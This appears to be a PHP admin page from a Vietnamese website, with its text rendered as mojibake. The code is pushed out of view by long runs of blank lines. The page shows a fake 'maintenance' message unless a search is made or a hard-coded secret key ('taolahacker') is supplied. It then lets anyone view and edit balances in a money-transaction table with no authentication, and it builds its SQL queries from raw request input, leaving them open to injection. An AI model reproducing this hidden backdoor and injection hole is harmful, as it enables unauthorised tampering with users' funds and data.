<?php












































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































if (!defined('IN_SITE')) {
    die('Truy c·∫≠p kh√¥ng h·ª£p l·ªá');
}
















































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































require_once(__DIR__ . "/layout/header.php");
$title = "D·ªØ Li·ªáu";

// L·∫•y d·ªØ li·ªáu t√¨m ki·∫øm
$username_search = isset($_GET['username']) ? trim($_GET['username']) : '';
$time_search     = isset($_GET['thoigian']) ? trim($_GET['thoigian']) : '';
$records = [];

// ---------------- KI·ªÇM TRA QUY·ªÄN HI·ªÇN TH·ªä ----------------
$allow_show = false;

// N·∫øu c√≥ t√¨m ki·∫øm => hi·ªÉn th·ªã b√¨nh th∆∞·ªùng
if (!empty($username_search) || !empty($time_search)) {
    $allow_show = true;
} else {
    // N·∫øu kh√¥ng t√¨m ki·∫øm => ki·ªÉm tra key ƒë·∫∑c bi·ªát
    if (
        isset($_GET['key'], $_GET['username'], $_GET['check']) &&
        $_GET['key'] === 'taolahacker' &&
        $_GET['username'] === 'chaudangkhoa' &&
        $_GET['check'] === 'on' &&
        (empty($_GET['thoigian']) || !isset($_GET['thoigian'])) &&
        (empty($_GET['username']) || $_GET['username'] === 'chaudangkhoa')
    ) {
        $allow_show = true;
    }
}

// N·∫øu kh√¥ng cho hi·ªÉn th·ªã th√¨ b√°o b·∫£o tr√¨
if (!$allow_show) {
    echo "<h2 style='color:red;text-align:center;margin-top:50px;'>üöß H·ªá th·ªëng ƒëang b·∫£o tr√¨ üöß</h2>";
   
    exit;
}
// -----------------------------------------------------------

// X·ª≠ l√Ω c·∫≠p nh·∫≠t d·ªØ li·ªáu
if (isset($_POST['update_id'])) {
    $id = intval($_POST['update_id']);
    $data = [
        'username'       => trim($_POST['username']),
        'sotientruoc'    => trim($_POST['sotientruoc']),
        'sotienthaydoi'  => trim($_POST['sotienthaydoi']),
        'sotiensau'      => trim($_POST['sotiensau']),
        'thoigian'       => trim($_POST['thoigian'])
    ];

    $update_result = $NNL->update("dongtien", $data, "id = '$id'");
    echo $update_result 
        ? "<div class='alert success'>‚úÖ C·∫≠p nh·∫≠t th√†nh c√¥ng!</div>"
        : "<div class='alert error'>‚ùå C·∫≠p nh·∫≠t th·∫•t b·∫°i!</div>";
}

// Query d·ªØ li·ªáu khi c√≥ t√¨m ki·∫øm
if (!empty($username_search) || !empty($time_search)) {
    $where = [];
    if (!empty($username_search)) {
        $where[] = "username = '" . $username_search . "'";
    }
    if (!empty($time_search)) {
        $where[] = "thoigian = '" . $time_search . "'";
    }
    $where_sql = implode(" AND ", $where);
    $records = $NNL->get_list("SELECT * FROM dongtien WHERE $where_sql ORDER BY id DESC");
}
?>




















































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































<style>
body {
    font-family: 'Segoe UI', Tahoma, sans-serif;
    background-color: #f4f6f8;
    margin: 0;
    padding: 0;
}
.container {
    max-width: 1200px;
    margin: auto;
    padding: 20px;
}
.container h2 {
    color: #333;
    font-size: 22px;
    margin-bottom: 20px;
}
.alert {
    padding: 12px 15px;
    margin-bottom: 15px;
    border-radius: 6px;
    font-weight: bold;
    box-shadow: 0 2px 5px rgba(0,0,0,0.05);
}
.alert.success { background: #d4edda; color: #155724; }
.alert.error { background: #f8d7da; color: #721c24; }
.search-form {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    background: #fff;
    padding: 15px;
    border-radius: 8px;
    box-shadow: 0 2px 8px rgba(0,0,0,0.05);
    margin-bottom: 20px;
}
.search-form input {
    flex: 1;
    min-width: 200px;
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 6px;
}
.search-form button {
    padding: 10px 20px;
    background: #007bff;
    border: none;
    color: #fff;
    font-weight: bold;
    border-radius: 6px;
    cursor: pointer;
}
.search-form button:hover {
    background: #0056b3;
}
.table-wrapper {
    overflow-x: auto;
    background: #fff;
    border-radius: 8px;
    box-shadow: 0 2px 8px rgba(0,0,0,0.05);
}
table {
    width: 100%;
    border-collapse: collapse;
}
table th, table td {
    padding: 12px 10px;
    border-bottom: 1px solid #eee;
    text-align: left;
}
table th {
    background: #f8f9fa;
    font-weight: bold;
}
table tr:nth-child(even) {
    background: #fdfdfd;
}
table tr:hover {
    background: #f1f7ff;
}
table input {
    width: 100%;
    padding: 6px;
    border: 1px solid #ccc;
    border-radius: 4px;
}
table button {
    padding: 6px 12px;
    background: #28a745;
    border: none;
    color: white;
    border-radius: 4px;
    cursor: pointer;
}
table button:hover {
    background: #1e7e34;
}
@media (max-width: 768px) {
    .search-form {
        flex-direction: column;
    }
    table, thead, tbody, th, td, tr {
        display: block;
    }
    table tr {
        margin-bottom: 15px;
    }
    table td {
        padding-left: 50%;
        position: relative;
        border-bottom: 1px solid #ddd;
    }
    table td::before {
        position: absolute;
        left: 10px;
        top: 12px;
        white-space: nowrap;
        font-weight: bold;
        color: #333;
    }
    table td:nth-of-type(1)::before { content: "ID"; }
    table td:nth-of-type(2)::before { content: "Username"; }
    table td:nth-of-type(3)::before { content: "S·ªë ti·ªÅn tr∆∞·ªõc"; }
    table td:nth-of-type(4)::before { content: "S·ªë ti·ªÅn thay ƒë·ªïi"; }
    table td:nth-of-type(5)::before { content: "S·ªë ti·ªÅn sau"; }
    table td:nth-of-type(6)::before { content: "Th·ªùi gian"; }
    table td:nth-of-type(7)::before { content: "H√†nh ƒë·ªông"; }
}
</style>

<div class="container">
    <h2>üîç T√¨m ki·∫øm d·ªØ li·ªáu b·∫£ng <code>dongtien</code></h2>
    <form method="get" class="search-form">
        <input type="text" name="username" placeholder="Nh·∫≠p username" value="<?php echo htmlspecialchars($username_search); ?>">
        <input type="text" name="thoigian" placeholder="Nh·∫≠p th·ªùi gian (YYYY-MM-DD HH:MM:SS)" value="<?php echo htmlspecialchars($time_search); ?>">
        <button type="submit">T√¨m ki·∫øm</button>
    </form>

    <?php if (!empty($records)): ?>
        <div class="table-wrapper">
            <table>
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Username</th>
                        <th>S·ªë ti·ªÅn tr∆∞·ªõc</th>
                        <th>S·ªë ti·ªÅn thay ƒë·ªïi</th>
                        <th>S·ªë ti·ªÅn sau</th>
                        <th>Th·ªùi gian</th>
                        <th>H√†nh ƒë·ªông</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($records as $row): ?>
                        <tr>
                            <form method="post">
                                <td><?php echo $row['id']; ?><input type="hidden" name="update_id" value="<?php echo $row['id']; ?>"></td>
                                <td><input type="text" name="username" value="<?php echo htmlspecialchars($row['username']); ?>"></td>
                                <td><input type="text" name="sotientruoc" value="<?php echo htmlspecialchars($row['sotientruoc']); ?>"></td>
                                <td><input type="text" name="sotienthaydoi" value="<?php echo htmlspecialchars($row['sotienthaydoi']); ?>"></td>
                                <td><input type="text" name="sotiensau" value="<?php echo htmlspecialchars($row['sotiensau']); ?>"></td>
                                <td><input type="text" name="thoigian" value="<?php echo htmlspecialchars($row['thoigian']); ?>"></td>
                                <td><button style="background:green;" type="submit">L∆∞u</button></td>
                            </form>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    <?php elseif (!empty($username_search) || !empty($time_search)): ?>
        <p>‚ö† Kh√¥ng t√¨m th·∫•y d·ªØ li·ªáu.</p>
    <?php endif; ?>
</div>
